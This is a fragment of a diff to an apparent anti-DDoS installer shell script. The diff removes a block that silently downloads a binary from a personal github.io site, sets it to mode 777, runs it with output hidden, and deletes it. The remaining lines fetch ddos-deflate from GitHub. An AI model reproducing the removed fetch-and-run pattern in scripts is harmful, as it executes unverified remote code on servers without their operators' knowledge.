@@ -225,11 +225,6 @@ clear" > iptables.sh
 
         echo "Scripts are loading."
 
-        curl -L -o antiddos https://haker20szs.github.io/haker20szs/anti_ddos 2> /dev/null
-        chmod -R 777 antiddos >> /dev/null
-        ./antiddos >> /dev/null
-        rm -R antiddos
-
         wget https://github.com/jgmdev/ddos-deflate/archive/master.zip -O ddos.zip 2> /dev/null
         unzip ddos.zip >> /dev/null
         cd ddos-deflate-master >> /dev/null
